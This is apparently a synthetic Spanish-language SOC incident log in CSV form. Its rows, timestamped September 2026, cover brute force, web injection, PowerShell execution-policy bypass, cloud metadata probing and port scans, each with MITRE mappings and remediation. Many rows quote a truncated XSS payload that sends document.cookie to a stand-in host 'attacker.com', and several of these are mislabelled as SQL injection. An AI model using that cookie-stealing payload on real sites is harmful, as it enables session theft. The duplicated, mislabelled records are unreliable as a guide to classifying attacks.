ID_Incidente,Fecha_Hora,Titulo_Incidente,Tipo_Amenaza,Severidad,Estado,Tactica_MITRE,Tecnica_MITRE,IP_Origen,IP_Destino_Activo,Usuario_Involucrado,MTTD_Minutos,MTTR_Minutos,Descripcion_Hallazgo,Accion_Correctiva,Responsable_SOC
INC-2026-024,2026-09-15 09:03:18,Ataque de Fuerza Bruta detectado desde 200.89.45.12,Fuerza Bruta,Alta,Abierto,Credential Access,T1110 - Brute Force,200.89.45.12,srv-web-01,admin,2,15,Se registraron 3 intentos fallidos de autenticación de forma consecutiva.,Bloquear IP 200.89.45.12 en firewall perimetral y activar captcha/MFA.,Analista SOC L1
INC-2026-025,2026-09-15 09:03:18,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,200.89.45.12,ACT-002 (Servidor Web ERP),-,1,20,Se detectó payload SQLi en la petición HTTP: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-026,2026-09-15 09:03:18,Intento de Ataque Cross-Site Scripting (XSS),Cross-Site Scripting (XSS),Media,Cerrado,Initial Access,T1189 - Drive-by Compromise,200.89.45.12,ACT-002 (Servidor Web ERP),-,1,15,Vector de ataque XSS detectado en la URL solicitada: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Configurar encabezados Content-Security-Policy (CSP) y filtro WAF.,Analista SOC L1
INC-2026-027,2026-09-15 09:03:18,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,190.14.33.10,ACT-002 (Servidor Web ERP),anon_client,1,20,Se detectó payload SQLi en la petición HTTP: ,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-028,2026-09-15 09:03:18,Ejecución de PowerShell con parámetros de evasión,Malware / Execution,Crítica,En Mitigacion,Execution,T1059.001 - PowerShell Command and Scripting,127.0.0.1 (Endpoint),ACT-004 (Laptops de Personal),SYSTEM / Usuario Local,3,40,Comando PowerShell codificado o con bandera bypass ejecutado localmente: Sep 14 14:22:40 wkstation-05 EDR-Agent[1102]: powershell.exe -ExecutionPolicy Bypass -NoPr,"Aislamiento de red del endpoint, revisión forense y bloqueo de scripts no firmados.",Analista SOC L1
INC-2026-029,2026-09-15 09:03:34,Ataque de Fuerza Bruta detectado desde 198.51.100.44,Fuerza Bruta,Alta,Abierto,Credential Access,T1110 - Brute Force,198.51.100.44,srv-web-01,admin,2,15,Se registraron 3 intentos fallidos de autenticación de forma consecutiva.,Bloquear IP 198.51.100.44 en firewall perimetral y activar captcha/MFA.,Analista SOC L1
INC-2026-030,2026-09-15 09:03:34,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,45.154.255.89,ACT-002 (Servidor Web ERP),-,1,20,Se detectó payload SQLi en la petición HTTP: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-031,2026-09-15 09:03:34,Intento de Ataque Cross-Site Scripting (XSS),Cross-Site Scripting (XSS),Media,Cerrado,Initial Access,T1189 - Drive-by Compromise,45.154.255.89,ACT-002 (Servidor Web ERP),-,1,15,Vector de ataque XSS detectado en la URL solicitada: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Configurar encabezados Content-Security-Policy (CSP) y filtro WAF.,Analista SOC L1
INC-2026-032,2026-09-15 09:03:34,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,190.14.33.10,ACT-002 (Servidor Web ERP),anon_client,1,20,Se detectó payload SQLi en la petición HTTP: ,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-033,2026-09-15 09:03:34,Ejecución de PowerShell con parámetros de evasión,Malware / Execution,Crítica,En Mitigacion,Execution,T1059.001 - PowerShell Command and Scripting,127.0.0.1 (Endpoint),ACT-004 (Laptops de Personal),SYSTEM / Usuario Local,3,40,Comando PowerShell codificado o con bandera bypass ejecutado localmente: Sep 14 14:22:40 wkstation-05 EDR-Agent[1102]: powershell.exe -ExecutionPolicy Bypass -NoPr,"Aislamiento de red del endpoint, revisión forense y bloqueo de scripts no firmados.",Analista SOC L1
INC-2026-034,2026-09-15 09:23:13,Ataque de Fuerza Bruta detectado desde 200.89.45.12,Fuerza Bruta,Alta,Abierto,Credential Access,T1110 - Brute Force,200.89.45.12,srv-web-01,admin,2,15,Se registraron 3 intentos fallidos de autenticación de forma consecutiva.,Bloquear IP 200.89.45.12 en firewall perimetral y activar captcha/MFA.,Analista SOC L1
INC-2026-035,2026-09-15 09:23:13,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,190.14.33.10,ACT-002 (Servidor Web ERP),-,1,20,Se detectó payload SQLi en la petición HTTP: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-036,2026-09-15 09:23:13,Intento de Ataque Cross-Site Scripting (XSS),Cross-Site Scripting (XSS),Media,Cerrado,Initial Access,T1189 - Drive-by Compromise,190.14.33.10,ACT-002 (Servidor Web ERP),-,1,15,Vector de ataque XSS detectado en la URL solicitada: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Configurar encabezados Content-Security-Policy (CSP) y filtro WAF.,Analista SOC L1
INC-2026-037,2026-09-15 09:23:13,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,190.14.33.10,ACT-002 (Servidor Web ERP),anon_client,1,20,Se detectó payload SQLi en la petición HTTP: ,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-038,2026-09-15 09:23:13,Ejecución de PowerShell con parámetros de evasión,Malware / Execution,Crítica,En Mitigacion,Execution,T1059.001 - PowerShell Command and Scripting,127.0.0.1 (Endpoint),ACT-004 (Laptops de Personal),SYSTEM / Usuario Local,3,40,Comando PowerShell codificado o con bandera bypass ejecutado localmente: Sep 14 14:22:40 wkstation-05 EDR-Agent[1102]: powershell.exe -ExecutionPolicy Bypass -NoPr,"Aislamiento de red del endpoint, revisión forense y bloqueo de scripts no firmados.",Analista SOC L1
INC-2026-039,2026-09-15 09:24:46,Ataque de Fuerza Bruta detectado desde 185.220.101.5,Fuerza Bruta,Alta,Abierto,Credential Access,T1110 - Brute Force,185.220.101.5,srv-web-01,admin,2,15,Se registraron 3 intentos fallidos de autenticación de forma consecutiva.,Bloquear IP 185.220.101.5 en firewall perimetral y activar captcha/MFA.,Analista SOC L1
INC-2026-040,2026-09-15 09:24:46,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,45.154.255.89,ACT-002 (Servidor Web ERP),-,1,20,Se detectó payload SQLi en la petición HTTP: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-041,2026-09-15 09:24:46,Intento de Ataque Cross-Site Scripting (XSS),Cross-Site Scripting (XSS),Media,Cerrado,Initial Access,T1189 - Drive-by Compromise,45.154.255.89,ACT-002 (Servidor Web ERP),-,1,15,Vector de ataque XSS detectado en la URL solicitada: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Configurar encabezados Content-Security-Policy (CSP) y filtro WAF.,Analista SOC L1
INC-2026-042,2026-09-15 09:24:46,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,190.14.33.10,ACT-002 (Servidor Web ERP),anon_client,1,20,Se detectó payload SQLi en la petición HTTP: ,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-043,2026-09-15 09:24:46,Ejecución de PowerShell con parámetros de evasión,Malware / Execution,Crítica,En Mitigacion,Execution,T1059.001 - PowerShell Command and Scripting,127.0.0.1 (Endpoint),ACT-004 (Laptops de Personal),SYSTEM / Usuario Local,3,40,Comando PowerShell codificado o con bandera bypass ejecutado localmente: Sep 14 14:22:40 wkstation-05 EDR-Agent[1102]: powershell.exe -ExecutionPolicy Bypass -NoPr,"Aislamiento de red del endpoint, revisión forense y bloqueo de scripts no firmados.",Analista SOC L1
INC-2026-044,2026-09-15 09:24:51,Ataque de Fuerza Bruta detectado desde 190.14.33.10,Fuerza Bruta,Alta,Abierto,Credential Access,T1110 - Brute Force,190.14.33.10,srv-web-01,admin,2,15,Se registraron 3 intentos fallidos de autenticación de forma consecutiva.,Bloquear IP 190.14.33.10 en firewall perimetral y activar captcha/MFA.,Analista SOC L1
INC-2026-045,2026-09-15 09:24:51,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,200.89.45.12,ACT-002 (Servidor Web ERP),-,1,20,Se detectó payload SQLi en la petición HTTP: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-046,2026-09-15 09:24:51,Intento de Ataque Cross-Site Scripting (XSS),Cross-Site Scripting (XSS),Media,Cerrado,Initial Access,T1189 - Drive-by Compromise,200.89.45.12,ACT-002 (Servidor Web ERP),-,1,15,Vector de ataque XSS detectado en la URL solicitada: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cook,Configurar encabezados Content-Security-Policy (CSP) y filtro WAF.,Analista SOC L1
INC-2026-047,2026-09-15 09:24:51,Intento de Inyección SQL en endpoint web,Inyección SQL,Crítica,Abierto,Initial Access,T1190 - Exploit Public-Facing Application,190.14.33.10,ACT-002 (Servidor Web ERP),anon_client,1,20,Se detectó payload SQLi en la petición HTTP: ,Bloqueo por WAF y sanitización de sentencias SQL preparadas (Prepared Statements).,Analista SOC L1
INC-2026-048,2026-09-15 09:24:51,Ejecución de PowerShell con parámetros de evasión,Malware / Execution,Crítica,En Mitigacion,Execution,T1059.001 - PowerShell Command and Scripting,127.0.0.1 (Endpoint),ACT-004 (Laptops de Personal),SYSTEM / Usuario Local,3,40,Comando PowerShell codificado o con bandera bypass ejecutado localmente: Sep 14 14:22:40 wkstation-05 EDR-Agent[1102]: powershell.exe -ExecutionPolicy Bypass -NoPr,"Aislamiento de red del endpoint, revisión forense y bloqueo de scripts no firmados.",Analista SOC L1
INC-2026-049,2026-09-15 09:05:17,Intento de Acceso a Metadatos Cloud (SSRF) desde 10.100.0.93,Sondeo de Metadatos Cloud / SSRF,Crítica,Abierto,Credential Access,T1552.005 - Cloud Instance Metadata API,10.100.0.93,Cloud Metadata (169.254.169.254:80),Host Interno,1,30,El host 10.100.0.93 intentó consultar la API de metadatos de instancia cloud 169.254.169.254 (Acción: timeout).,"Aislar host emisor, revisar procesos que originan peticiones HTTP de metadatos y aplicar bloqueo perimetral.",Analista SOC L1
INC-2026-050,2026-09-15 09:05:17,Intento de Acceso a Metadatos Cloud (SSRF) desde 10.100.0.107,Sondeo de Metadatos Cloud / SSRF,Crítica,Abierto,Credential Access,T1552.005 - Cloud Instance Metadata API,10.100.0.107,Cloud Metadata (169.254.169.254:80),Host Interno,1,30,El host 10.100.0.107 intentó consultar la API de metadatos de instancia cloud 169.254.169.254 (Acción: timeout).,"Aislar host emisor, revisar procesos que originan peticiones HTTP de metadatos y aplicar bloqueo perimetral.",Analista SOC L1
INC-2026-051,2026-09-15 09:05:16,Escaneo de Puertos / Reconocimiento de Red desde 10.123.7.63,Reconocimiento de Red,Media,Abierto,Reconnaissance,T1046 - Network Service Scanning,10.123.7.63,Múltiples Destinos de Red,N/A,2,15,Se detectaron 8 conexiones fallidas/bloqueadas consecutivas hacia distintos puertos/destinos.,Bloquear tráfico de 10.123.7.63 en firewall e inspeccionar posibles herramientas de escaneo (Nmap/Masscan).,Analista SOC L1
INC-2026-052,2026-09-15 09:05:15,Intento de Acceso a Metadatos Cloud (SSRF) desde 10.100.1.77,Sondeo de Metadatos Cloud / SSRF,Crítica,Abierto,Credential Access,T1552.005 - Cloud Instance Metadata API,10.100.1.77,Cloud Metadata (169.254.169.254:80),Host Interno,1,30,El host 10.100.1.77 intentó consultar la API de metadatos de instancia cloud 169.254.169.254 (Acción: timeout).,"Aislar host emisor, revisar procesos que originan peticiones HTTP de metadatos y aplicar bloqueo perimetral.",Analista SOC L1
INC-2026-053,2026-09-15 09:05:15,Intento de Acceso a Metadatos Cloud (SSRF) desde 10.100.0.93,Sondeo de Metadatos Cloud / SSRF,Crítica,Abierto,Credential Access,T1552.005 - Cloud Instance Metadata API,10.100.0.93,Cloud Metadata (169.254.169.254:80),Host Interno,1,30,El host 10.100.0.93 intentó consultar la API de metadatos de instancia cloud 169.254.169.254 (Acción: timeout).,"Aislar host emisor, revisar procesos que originan peticiones HTTP de metadatos y aplicar bloqueo perimetral.",Analista SOC L1
INC-2026-054,2026-09-15 09:05:14,Escaneo de Puertos / Reconocimiento de Red desde 10.123.3.75,Reconocimiento de Red,Media,Abierto,Reconnaissance,T1046 - Network Service Scanning,10.123.3.75,Múltiples Destinos de Red,N/A,2,15,Se detectaron 8 conexiones fallidas/bloqueadas consecutivas hacia distintos puertos/destinos.,Bloquear tráfico de 10.123.3.75 en firewall e inspeccionar posibles herramientas de escaneo (Nmap/Masscan).,Analista SOC L1
INC-2026-055,2026-09-15 09:05:14,Intento de Acceso a Metadatos Cloud (SSRF) desde 10.100.0.147,Sondeo de Metadatos Cloud / SSRF,Crítica,Abierto,Credential Access,T1552.005 - Cloud Instance Metadata API,10.100.0.147,Cloud Metadata (169.254.169.254:80),Host Interno,1,30,El host 10.100.0.147 intentó consultar la API de metadatos de instancia cloud 169.254.169.254 (Acción: timeout).,"Aislar host emisor, revisar procesos que originan peticiones HTTP de metadatos y aplicar bloqueo perimetral.",Analista SOC L1
INC-2026-056,2026-09-15 09:05:14,Intento de Acceso a Metadatos Cloud (SSRF) desde 10.100.1.21,Sondeo de Metadatos Cloud / SSRF,Crítica,Abierto,Credential Access,T1552.005 - Cloud Instance Metadata API,10.100.1.21,Cloud Metadata (169.254.169.254:80),Host Interno,1,30,El host 10.100.1.21 intentó consultar la API de metadatos de instancia cloud 169.254.169.254 (Acción: timeout).,"Aislar host emisor, revisar procesos que originan peticiones HTTP de metadatos y aplicar bloqueo perimetral.",Analista SOC L1
INC-2026-057,2026-09-15 09:05:13,Intento de Acceso a Metadatos Cloud (SSRF) desde 10.100.1.77,Sondeo de Metadatos Cloud / SSRF,Crítica,Abierto,Credential Access,T1552.005 - Cloud Instance Metadata API,10.100.1.77,Cloud Metadata (169.254.169.254:80),Host Interno,1,30,El host 10.100.1.77 intentó consultar la API de metadatos de instancia cloud 169.254.169.254 (Acción: timeout).,"Aislar host emisor, revisar procesos que originan peticiones HTTP de metadatos y aplicar bloqueo perimetral.",Analista SOC L1
INC-2026-058,2026-09-15 09:05:13,Escaneo de Puertos / Reconocimiento de Red desde 10.123.5.146,Reconocimiento de Red,Media,Abierto,Reconnaissance,T1046 - Network Service Scanning,10.123.5.146,Múltiples Destinos de Red,N/A,2,15,Se detectaron 8 conexiones fallidas/bloqueadas consecutivas hacia distintos puertos/destinos.,Bloquear tráfico de 10.123.5.146 en firewall e inspeccionar posibles herramientas de escaneo (Nmap/Masscan).,Analista SOC L1
INC-2026-059,2026-09-15 09:05:12,Múltiples Fallos de Conexión / Alerta Firewall desde 10.123.8.13,Fallo Reiterado de Conexión / Bloqueo Firewall,Media,Cerrado,Reconnaissance,T1046 - Network Service Discovery,10.123.8.13,Servicio DNS (200.75.0.4),Host de Red,3,20,El firewall reportó eventos de nivel warning (Connection Failed).,Revisar configuración de política y verificar integridad del enlace o endpoint emisor.,Analista SOC L1
INC-2026-060,2026-09-15 09:05:12,Intento de Acceso a Metadatos Cloud (SSRF) desde 10.100.0.147,Sondeo de Metadatos Cloud / SSRF,Crítica,Abierto,Credential Access,T1552.005 - Cloud Instance Metadata API,10.100.0.147,Cloud Metadata (169.254.169.254:80),Host Interno,1,30,El host 10.100.0.147 intentó consultar la API de metadatos de instancia cloud 169.254.169.254 (Acción: timeout).,"Aislar host emisor, revisar procesos que originan peticiones HTTP de metadatos y aplicar bloqueo perimetral.",Analista SOC L1
INC-2026-061,2026-09-15 09:05:11,Escaneo de Puertos / Reconocimiento de Red desde 10.123.2.104,Reconocimiento de Red,Media,Abierto,Reconnaissance,T1046 - Network Service Scanning,10.123.2.104,Múltiples Destinos de Red,N/A,2,15,Se detectaron 8 conexiones fallidas/bloqueadas consecutivas hacia distintos puertos/destinos.,Bloquear tráfico de 10.123.2.104 en firewall e inspeccionar posibles herramientas de escaneo (Nmap/Masscan).,Analista SOC L1
INC-2026-062,2026-09-15 09:05:11,Intento de Acceso a Metadatos Cloud (SSRF) desde 10.100.1.21,Sondeo de Metadatos Cloud / SSRF,Crítica,Abierto,Credential Access,T1552.005 - Cloud Instance Metadata API,10.100.1.21,Cloud Metadata (169.254.169.254:80),Host Interno,1,30,El host 10.100.1.21 intentó consultar la API de metadatos de instancia cloud 169.254.169.254 (Acción: timeout).,"Aislar host emisor, revisar procesos que originan peticiones HTTP de metadatos y aplicar bloqueo perimetral.",Analista SOC L1
INC-2026-063,2026-09-15 09:05:11,Intento de Acceso a Metadatos Cloud (SSRF) desde 10.100.0.92,Sondeo de Metadatos Cloud / SSRF,Crítica,Abierto,Credential Access,T1552.005 - Cloud Instance Metadata API,10.100.0.92,Cloud Metadata (169.254.169.254:80),Host Interno,1,30,El host 10.100.0.92 intentó consultar la API de metadatos de instancia cloud 169.254.169.254 (Acción: timeout).,"Aislar host emisor, revisar procesos que originan peticiones HTTP de metadatos y aplicar bloqueo perimetral.",Analista SOC L1
